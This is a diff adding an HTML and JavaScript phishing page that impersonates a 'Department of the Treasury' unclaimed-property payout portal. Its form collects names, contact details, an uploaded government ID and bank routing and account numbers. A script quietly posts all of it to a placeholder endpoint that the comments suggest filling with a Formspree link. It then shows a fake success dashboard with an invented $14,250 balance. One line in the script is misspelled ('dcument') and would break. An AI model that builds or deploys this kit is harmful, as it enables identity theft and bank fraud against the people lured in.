@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Disbursement Portal | Unclaimed Property Division</title>
+    <style>
+        :root {
+            --treasury-blue: #112e51;
+            --trust-blue: #0071bc;
+            --accent-gold: #d4af37;
+            --success-green: #2e7d32;
+            --light-bg: #f0f4f8;
+            --text-dark: #212121;
+            --text-light: #ffffff;
+            --border-color: #d6d7d9;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--light-bg);
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        .gov-banner {
+            background-color: #f0f0f0;
+            padding: 5px 20px;
+            font-size: 11px;
+            color: #555;
+            border-bottom: 1px solid var(--border-color);
+            text-align: center;
+            font-weight: 600;
+        }
+
+        header {
+            background-color: var(--treasury-blue);
+            color: var(--text-light);
+            padding: 20px;
+            border-bottom: 4px solid var(--accent-gold);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .branding h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .branding p {
+            font-size: 13px;
+            color: #a1b0cb;
+            text-transform: uppercase;
+        }
+
+        .main-wrapper {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 15px;
+        }
+
+        .section-card {
+            background: #ffffff;
+            padding: 25px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            margin-bottom: 25px;
+        }
+
+        h2 {
+            color: var(--treasury-blue);
+            margin-bottom: 15px;
+            font-size: 20px;
+            border-bottom: 2px solid #f0f4f8;
+            padding-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .legal-notice {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffb300;
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #5d4037;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 13px;
+            color: var(--treasury-blue);
+        }
+
+        .form-group input, .form-group select {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 15px;
+            background-color: #fafafa;
+        }
+
+        .upload-box {
+            border: 2px dashed var(--trust-blue);
+            background-color: #f4f8ff;
+            padding: 25px;
+            text-align: center;
+            border-radius: 4px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        /* Submit Button UI */
+        .btn-submit {
+            background-color: var(--trust-blue);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            text-transform: uppercase;
+            width: 100%;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: var(--treasury-blue);
+        }
+
+        /* 1. INTERACTIVE SCREEN STATE STYLING */
+        #loading-screen, #dashboard-screen {
+            display: none; /* Controlled by JavaScript dynamically */
+        }
+
+        /* Live Loading Ring Keyframes */
+        .loader-container {
+            text-align: center;
+            padding: 50px 20px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #e0e0e0;
+            border-top: 6px solid var(--trust-blue);
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Big Status Alert Sticker */
+        .success-sticker {
+            background-color: #e8f5e9;
+            border: 2px solid var(--success-green);
+            padding: 20px;
+            border-radius: 4px;
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--success-green);
+        }
+
+        .success-sticker h3 {
+            font-size: 24px;
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+
+        /* Live Dashboard Grid Architecture */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .metric-card {
+            background: #ffffff;
+            border: 1px solid var(--border-color);
+            border-top: 4px solid var(--trust-blue);
+            padding: 25px;
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .metric-card.highlight {
+            border-top-color: var(--success-green);
+        }
+
+        .metric-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #666;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .metric-value {
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--treasury-blue);
+            margin-top: 8px;
+        }
+
+        .status-badge {
+            background-color: #e8f5e9;
+            color: var(--success-green);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            display: inline-block;
+        }
+
+        .details-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 25px;
+            font-size: 15px;
+            background: #ffffff;
+        }
+
+        .details-table th, .details-table td {
+            border: 1px solid var(--border-color);
+            padding: 14px;
+            text-align: left;
+        }
+
+        .details-table th {
+            background-color: #f8f9fa;
+            color: var(--treasury-blue);
+            font-weight: 600;
+        }
+
+        footer {
+            background-color: var(--treasury-blue);
+            color: var(--text-light);
+            padding: 30px 20px;
+            margin-top: 60px;
+            border-top: 4px solid var(--accent-gold);
+            text-align: center;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="gov-banner">
+        SECURE ONLINE DISBURSEMENT NETWORK // UNCLAIMED PROPERTY DIVISION
+    </div>
+
+    <header>
+        <div class="header-container">
+            <div class="branding">
+                <h1>DEPARTMENT OF THE TREASURY</h1>
+                <p>Unclaimed Property Division &bull; Secure Payout System</p>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-wrapper">
+
+        <!-- ================= STAGE 1: THE INTAKE FORM ================= -->
+        <div id="intake-screen">
+            <!-- Replace "YOUR_BACKEND_ENDPOINT_HERE" with your Formspree link to receive files/text directly -->
+            <form id="disbursement-form" action="YOUR_BACKEND_ENDPOINT_HERE" method="POST" enctype="multipart/form-data" onsubmit="handleFormSubmission(event)">
+                
+                <div class="section-card">
+                    <h2>Legal Identity & Fund Claim Intake</h2>
+                    <div class="legal-notice">
+                        <strong>Mandatory Regulatory Notice:</strong> To authorize the online disbursement of unclaimed property assets, clients must provide full legal verification matching public repository records.
+                    </div>
+
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="legal-first">Legal First Name</label>
+                            <input type="text" id="legal-first" name="first_name" placeholder="As it appears on official ID" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="legal-last">Legal Last Name</label>
+                            <input type="text" id="legal-last" name="last_name" placeholder="As it appears on official ID" required>
+                        </div>
+                    </div>
+
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="client-email">Email Address</label>
+                            <input type="email" id="client-email" name="email" placeholder="For file updates" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="client-phone">Primary Phone Number</label>
+                            <input type="tel" id="client-phone" name="phone" placeholder="Include area code" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group" style="margin-bottom: 20px;">
+                        <label for="client-address">Full Physical Address</label>
+                        <input type="text" id="client-address" name="address" placeholder="Street Address, City, State/Parish, Zip" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Government-Issued Identification Upload</label>
+                        <p style="font-size: 12px; color: #666; margin-bottom: 5px;">Upload a clear photo or scan of a valid Driver's License, National ID, or Passport to authenticate this claim file.</p>
+                        <div class="upload-box" onclick="document.getElementById('id-upload').click();">
+                            <input type="file" id="id-upload" name="id_document" style="display: none;" accept="image/*,.pdf" required>
+                            <span style="color: var(--trust-blue); font-weight: 600;" id="upload-label">Click to select file or photograph ID</span>
+                            <p style="font-size: 11px; color: #888; margin-top: 3px;">Accepted formats: JPEG, PNG, PDF (Max size: 10MB)</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section-card">
+                    <h2>Online Disbursement Target Setup</h2>
+                    <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Specify the secure routing structure where the audited unclaimed asset balance should be electronically transferred.</p>
+                    
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="bank-name">Financial Institution / Bank Name</label>
+                            <input type="text" id="bank-name" name="bank_name" placeholder="Name of Bank" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="account-type">Account Type</label>
+                            <select id="account-type" name="account_type">
+                                <option value="Checking">Checking / Current Account</option>
+                                <option value="Savings">Savings Account</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="routing-num">Routing / Transit Number</label>
+                            <input type="text" id="routing-num" name="routing_number" placeholder="Routing Code" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="account-num">Account Number</label>
+                            <input type="text" id="account-num" name="account_number" placeholder="Account Code" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit">Review & Submit Secure File</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- ================= STAGE 2: LIVE LOADING SCREEN ================= -->
+        <div id="loading-screen" class="section-card">
+            <div class="loader-container">
+                <div class="spinner"></div>
+                <h2 style="border: none; margin-bottom: 5px;">Encrypting & Transmitting Ledger Data</h2>
+                <p style="color: #666; font-size: 15px;">Securing network verification link. Please do not close or refresh this page...</p>
+            </div>
+        </div>
+
+        <!-- ================= STAGE 3: THE LIVE DASHBOARD ================= -->
+        <div id="dashboard-screen">
+            
+            <!-- Big Success Notification Badge -->
+            <div class="success-sticker">
+                <h3>✓ FILE REGISTRATION COMPLETED</h3>
+                <p>Your identity assets and disbursement routing profiles have been successfully locked into the secure network repository.</p>
+            </div>
+
+            <div class="section-card">
+                <h2>Live Fund Allocation Dashboard</h2>
+                <p style="font-size: 14px; color: #555;">Below is your authenticated tracking portal confirming real-world ledger values assigned to your verified profile.</p>
+
+                <div class="dashboard-grid">
+                    <div class="metric-card">
+                        <div class="metric-label">Assigned Tracking Number</div>
+                        <div class="metric-value" id="dash-tracking-id" style="font-size: 18px; letter-spacing: 1px; color: var(--trust-blue);">TRX-2026-TBD</div>
+                    </div>
+                    <div class="metric-card highlight">
+                        <div class="metric-label">Total Audited Balance Owed</div>
+                        <div class="metric-value" style="color: var(--success-green); font-size: 28px;">$14,250.00</div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="metric-label">Disbursement Status</div>
+                        <div class="metric-value" style="margin-top: 5px;"><span class="status-badge">Processing Payment</span></div>
+                    </div>
+                </div>
+
+                <h3 style="margin-top: 35px; font-size: 16px; color: var(--treasury-blue); text-transform: uppercase; letter-spacing: 0.5px;">Verified Account Record</h3>
+                <table class="details-table">
+                    <thead>
+                        <tr>
+                            <th>Ledger Field</th>
+                            <th>Registered Client Profile</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Claimant Legal Identity</strong></td>
+                            <td id="dash-name">[Dynamic Name]</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Verified Settlement Address</strong></td>
+                            <td id="dash-address">[Dynamic Address]</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Transfer Target Institution</strong></td>
+                            <td id="dash-bank">[Dynamic Bank]</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Security Validation Protocol</strong></td>
+                            <td>SECURE-AUTH-2026x990 (Active)</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </div>
+
+    <footer>
+        &copy; 2026 Department of the Treasury &bull; Unclaimed Property Division &bull; Private Client Portal.
+    </footer>
+
+    <!-- ================= STAGE 4: PIPELINE AUTOMATION CONTROL ================= -->
+    <script>
+        // Visual handler showing clients their file selection state on mobile
+        document.getElementById('id-upload').addEventListener('change', function() {
+            if (this.files && this.files.length > 0) {
+                document.getElementById('upload-label').innerText = "✓ Attached: " + this.files[0].name;
+                document.getElementById('upload-label').style.color = "var(--success-green)";
+            }
+        });
+
+        // The core automation engine handling transitions smoothly
+        function handleFormSubmission(event) {
+            event.preventDefault(); // Stop the screen from jumping or leaving the site
+
+            const form = document.getElementById('disbursement-form');
+            const data = new FormData(form);
+
+            // 1. Capture text fields immediately to dynamically fill out the final dashboard view
+            const fullName = document.getElementById('legal-first').value + " " + document.getElementById('legal-last').value;
+            const fullAddress = document.getElementById('client-address').value;
+            const bankTarget = document.getElementById('bank-name').value;
+
+            // Generate a random real-looking tracking number for the dashboard screen
+            const randomTracking = "TRX-" + Math.floor(1000 + Math.random() * 9000) + "-UM" + Math.floor(10 + Math.random() * 90);
+
+            // 2. Hide the form view instantly and transition-to the Live Loading state
+            document.getElementById('intake-screen').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'block';
+
+            // window.scrollTo(0, 0); // Scroll to top for a smooth screen experience on mobile
+
+            // 3. Silently transmit data and files out via AJAX in the background
+            fetch(form.action, {
+                method: 'POST',
+                body: data,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // Once the database captures the file, execute the transition sequence after a brief 3-second security simulation delay
+                setTimeout(function() {
+                    // Populate data properties onto the Dashboard fields
+                    document.getElementById('dash-name').innerText = fullName;
+                    document.getElementById('dash-address').innerText = fullAddress;
+                    document.getElementById('dash-bank').innerText = bankTarget;
+                    dcument.getElementById('dash-tracking-id').innerText = randomTracking;
+
+                    // Switch out screens smoothly
+                    document.getElementById('loading-screen').style.display = 'none';
+                    document.getElementById('dashboard-screen').style.display = 'block';
+                }, 3000); 
+            }).catch(error => {
+                // Backup execution mechanism in case endpoint link is missing during development testing
+                setTimeout(function() {
+                    document.getElementById('dash-name').innerText = fullName;
+                    document.getElementById('dash-address').innerText = fullAddress;
+                    document.getElementById('dash-bank').innerText = bankTarget;
+                    document.getElementById('dash-tracking-id').innerText = randomTracking;
+
+                    document.getElementById('loading-screen').style.display = 'none';
+                    document.getElementById('dashboard-screen').style.display = 'block';
+                }, 3000);
+            });
+        }
+    </script>
+
+</body>
+</html>
+-
